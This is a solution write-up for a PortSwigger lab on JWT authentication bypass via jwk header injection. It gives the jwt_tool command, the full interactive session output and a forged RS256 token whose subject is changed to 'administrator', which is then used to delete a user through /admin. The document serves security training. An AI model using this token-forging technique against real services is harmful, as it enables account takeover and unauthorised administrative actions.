---
tags:
  - jwt
---
# JWT authentication bypass via jwk header injection

## Instructions

This lab uses a JWT-based mechanism for handling sessions. The server supports the `jwk` parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source.

To solve the lab, modify and sign a JWT that gives you access to the admin panel at `/admin`, then delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

This lab also sets a JWT in a session cookie. 

We'll solve this lab using jwt_tool. 

The following command will inject an inline JWK header:

```bash title="Using jwt_tool to inject an inline JWK" hl_lines="1"
➜ jwt_tool eyJraWQiOiI5NzY5YTY4Ny05ZTU5LTRkZTQtOTZiOS04ODA2YzA3NWU5YjYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MzE1NDk3OCwic3ViIjoid2llbmVyIn0.CqbMWeNo1M9lvNiaaABD_3mMk_MmgWkvhsvFv-tSJ089oWEvrErDHgGm27YjUkJJCnxcQbefvm2dlhdJifLkovn5WKCJvkfn2rWyI6fJ9-IoMwXLLPSBf11CTaEa0qW3JlTXi9-gjqP72KqSWEytbrssXwYzza6rIo6PKkx7p1RWLu7F9LzY1I7KVxlQ9OPvzdQh0lwaIPxg0ncbJg-APuuhPT6vWZ-sAZoGlFp7ojLXFyI1p-rlIr4eR903OA2ZUiimEBJsTDI6BwwaFB4ar69uH503wYNoS8OchwMR9OO6dZdkGnTouIINwvRndO05-8tdbUXJgDqdmGoPsD2icA -T -X i
WARNING: The requested image's platform (linux/amd64) does not match the detected host platform (linux/arm64/v8) and no specific platform was requested

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.3.0                \______|             @ticarpi

/root/.jwt_tool/jwtconf.ini
Original JWT:


====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] kid = "9769a687-9e59-4de4-96b9-8806c075e9b6"
[2] alg = "RS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] iss = "portswigger"
[2] exp = 1763154978    ==> TIMESTAMP = 2025-11-14 21:16:18 (UTC)
[3] sub = "wiener"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 3

Current value of sub is: wiener
Please enter new value and hit ENTER
> administrator
[1] iss = "portswigger"
[2] exp = 1763154978    ==> TIMESTAMP = 2025-11-14 21:16:18 (UTC)
[3] sub = "administrator"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[6] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
key: /root/.jwt_tool/jwttool_custom_private_RSA.pem
jwttool_f67b9f83be144cd371df2f15d45a01c9 - EXPLOIT: injected JWKS
(This will only be valid on unpatched implementations of JWT.)
[+] eyJraWQiOiJqd3RfdG9vbCIsImFsZyI6IlJTMjU2IiwiandrIjp7Imt0eSI6IlJTQSIsImtpZCI6Imp3dF90b29sIiwidXNlIjoic2lnIiwiZSI6IkFRQUIiLCJuIjoidTV2M2V3YzF3YzNONS12VXNqWUREQ0VKWDVOeFBaX0JuaHZWNnhRZTNQUlZfNWpMa0ppdDZNYUlDU0lBODNUMG5oVUJsaGVoTGhvdWV3Qkl6ZXh0SDB2NlpOZUhiQVZDN3ZpUnpCZ2dpcHJvdWZsLW55b1ktQ3JnQWZOeEZGUXVCRXJWY1kwTUs4QTczQjZ6ek8tZXhFb0dGajhSbGgxWVpmVDNCNHhyWEdabjhIMkNyQU8yMko2YjFoQy0wQ0huRkZTVWQ3UlVkekh1YW1MZDF4RkFCRkdDYnFXZkk0SWZrOU14N0ROWmkzbm9oRVdGUzFZZ0hocGtRcFVjV0UtTDRSbjNLUWU4cUs0cW5jQlFYOEp2QkoxbWJqLTJYWHctbkhmQlllUkVQanJPdWhzNjBoYkRjQnJaenVrcXc5bGhEZVFJMHVDWGk2Z2V0UFF0ZDY2V3RRIn19.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc2MzE1NDk3OCwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.idwmoyl8dxt36W0ULWLiZUUDqv-wXAoTEG1pduhJBicgMaax8IWHv_pqx9deE67gTDkOq19B4mvDRJUlOQxwaPUaiCicgHPsJ1zXoAwlYYx0fIxa6l9AFd0cS3KVEOSq2WJbk4xCSMKNps7e4as-drO9z1H41YAa_1hrmymqEU2WDvsStRX4WI2lSL_D9HA6Jpt_-AvVrq05CWyvomJolVc_iA5WKhlNr4w8dx0geojmQEcUFCbdXwOw0ben3LWo890iEy77o5VJbjpDKbNWcOtNmXpXAJ2Gb81bzx_Tm3q0ImitwSSOW34r7bvqAKHPAFkeyZYG3sCrZTDsXoqGLw
```

The new JWT looks like this:

![](attachments/jwt-lab-3/file-20251124113610539.webp)

Pasting that new JWT into a previous request works and we can access the /admin/delete endpoint and delete the carlos user.

![](attachments/jwt-lab-3/file-20251124113610541.webp)

## Lesson learned

Check if a user-provided JWK header will be accepted by the application. 